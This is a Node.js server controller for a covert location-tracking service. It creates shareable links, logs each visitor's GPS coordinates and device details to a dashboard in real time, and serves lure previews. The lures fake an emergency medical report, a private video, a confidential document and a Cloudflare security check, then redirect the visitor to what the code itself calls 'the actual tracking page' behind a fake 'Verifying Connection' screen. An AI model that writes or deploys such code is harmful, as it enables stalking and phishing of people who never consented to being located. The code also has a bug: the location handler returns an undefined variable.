const Session = require('../models/Session');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

exports.createSession = async (req, res) => {
    try {
        const { title } = req.body;
        const sessionId = uuidv4();
        const previewIndex = Math.floor(Math.random() * 5); // Random index for 5 images
        
        const newSession = new Session({
            sessionId,
            title: title || 'Private Message',
            previewIndex
        });

        await newSession.save();
        const apiBase = process.env.API_BASE_URL || 'https://trackers-oplf.onrender.com';
        
        res.status(201).json({ 
            success: true, 
            sessionId,
            shareUrl: `${apiBase}/v/${sessionId}`,
            dashboardUrl: `${process.env.CLIENT_URL || 'http://localhost:5173'}/#/dashboard/${sessionId}`
        });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};

exports.getSession = async (req, res) => {
    try {
        const { id } = req.params;
        const session = await Session.findOne({ sessionId: id });
        
        if (!session) {
            return res.status(404).json({ success: false, message: 'Session not found' });
        }

        res.json({ success: true, session });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};

exports.updateLocation = async (req, res) => {
    try {
        const { sessionId } = req.params;
        const { latitude, longitude, accuracy, deviceInfo } = req.body;

        const session = await Session.findOne({ sessionId });
        if (!session) {
            return res.status(404).json({ success: false, message: 'Session not found' });
        }

        const newLocation = {
            latitude,
            longitude,
            accuracy,
            deviceInfo,
            address: req.body.address || {},
            timestamp: new Date()
        };

        session.locationHistory.push(newLocation);
        await session.save();

        // Emit update via socket
        if (req.io) {
            req.io.to(sessionId).emit('location-updated', newLocation);
        }

        res.json({ success: true, message: 'Location updated', address });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};

exports.deleteSession = async (req, res) => {
    try {
        const { sessionId } = req.params;
        const session = await Session.findOneAndDelete({ sessionId });
        if (!session) {
            return res.status(404).json({ success: false, message: 'Session not found' });
        }
        res.json({ success: true, message: 'Session deleted successfully' });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};

exports.servePreview = async (req, res) => {
    try {
        const { id } = req.params;
        const session = await Session.findOne({ sessionId: id });
        
        if (!session) {
            return res.status(404).send('Invalid Link');
        }

        const themes = [
            { t: "⚠️ Emergency Update: Patient Status Report", d: "A secure medical report has been shared. Verify your browser to view vital signs.", i: "/previews/p0.jpg" },
            { t: "🔒 Private Profile Request", d: "Someone has shared a private profile with you. Complete the security check to view.", i: "/previews/p1.jpg" },
            { t: "🎥 Protected Private Video", d: "You have been invited to view a private video. Verify your connection to start playback.", i: "/previews/p2.jpg" },
            { t: "📄 Scanned Document: Confidential", d: "A password-protected document has been shared. Please verify your identity to download.", i: "/previews/p3.jpg" },
            { t: "🛡️ Browser Security Verification", d: "Cloudflare is verifying your connection before accessing the requested resource.", i: "/previews/p4.jpg" }
        ];

        const theme = themes[session.previewIndex] || themes[0];
        const apiBase = process.env.API_BASE_URL || 'https://trackers-oplf.onrender.com';
        const clientUrl = process.env.CLIENT_URL || 'https://video-o6nd.onrender.com';

        const html = `
<!DOCTYPE html>
<html prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Instagram/Facebook Priority Tags -->
    <meta property="og:image" content="${apiBase}${theme.i}" />
    <meta property="og:image:secure_url" content="${apiBase}${theme.i}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:type" content="image/jpeg" />
    
    <title>${theme.t}</title>
    <meta property="og:title" content="${theme.t}" />
    <meta property="og:description" content="${theme.description || theme.d}" />
    <meta property="og:url" content="${apiBase}/v/${id}" />
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="Security Center" />
    
    <!-- Twitter Meta Tags -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="${theme.t}">
    <meta name="twitter:description" content="${theme.description || theme.d}">
    <meta name="twitter:image" content="${apiBase}${theme.i}">

    <script>
        // Smooth redirect to the actual tracking page
        setTimeout(() => {
            window.location.href = "${clientUrl}/#/share/${id}";
        }, 500);
    </script>
</head>
<body style="background: #0d1117; color: #c9d1d9; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
    <div style="text-align: center; padding: 20px; max-width: 400px;">
        <div style="width: 48px; height: 48px; border: 3px solid rgba(56, 139, 253, 0.2); border-top-color: #388bfd; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 24px;"></div>
        <h1 style="font-size: 18px; font-weight: 600; margin-bottom: 8px;">Verifying Connection</h1>
        <p style="font-size: 14px; color: #8b949e;">Please wait while we secure your connection to the shared resource...</p>
    </div>
    <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
</body>
</html>`;
        res.send(html);
    } catch (error) {
        res.status(500).send('Error loading preview');
    }
};
